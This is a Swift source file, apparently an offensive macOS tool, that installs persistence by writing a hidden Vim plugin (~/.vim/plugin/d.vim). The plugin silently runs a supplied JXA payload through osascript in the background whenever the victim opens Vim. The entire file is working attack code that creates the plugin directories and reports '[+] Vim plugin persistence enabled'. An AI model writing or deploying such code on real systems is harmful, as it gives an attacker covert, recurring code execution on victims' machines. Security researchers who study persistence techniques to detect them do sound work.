import Foundation
import Cocoa

//Usage: ./VimPluginPersistence [path_to_js_jxa_app]

let scriptName = CommandLine.arguments[0]
let fileMan = FileManager.default
let uName = NSUserName()
let home = "/Users/\(uName)"
var isDir = ObjCBool(true)

if CommandLine.arguments.count != 2{
    print("Usage: \(scriptName) [jxa_js_payload]")
    print("exiting...")
    exit(0)
}
else {
    let payload = CommandLine.arguments[1]
    let osapayload = "osascript \(payload) &"
    if fileMan.fileExists(atPath: payload){
        if fileMan.fileExists(atPath: "/usr/bin/vim"){
            
            do {
                var pluginTemplate =
                """
                silent execute '!' . 'payloadgoeshere'
                """
                
                var updatedTemplate = pluginTemplate.replacingOccurrences(of: "payloadgoeshere", with: osapayload)
                
                var pluginPath = "\(home)/.vim/plugin/d.vim"
                
                if !(fileMan.fileExists(atPath: "\(home)/.vim", isDirectory: &isDir)){
                    var vimURL = URL(fileURLWithPath: "\(home)/.vim")
                    try fileMan.createDirectory(at: vimURL, withIntermediateDirectories: false, attributes: nil)
                    
                }
                
                if !(fileMan.fileExists(atPath: "\(home)/.vim/plugin", isDirectory: &isDir)){
                    var pluginURL = URL(fileURLWithPath: "\(home)/.vim/plugin")
                    try fileMan.createDirectory(at: pluginURL, withIntermediateDirectories: false, attributes: nil)
                    
                }
                
                try updatedTemplate.write(toFile: pluginPath, atomically: true, encoding: .utf8)
                print("[+] Vim plugin persistence enabled at \(pluginPath)")
                
                
            }
            catch let error {
                print(error)
                
            }
            
        }
        else {
            print("[-] /usr/bin/vim not found on this host. Exiting...")
            exit(0)
        }
        
    }
    else {
        print("[-] Payload \(payload) not found. Exiting...")
    }
    
}
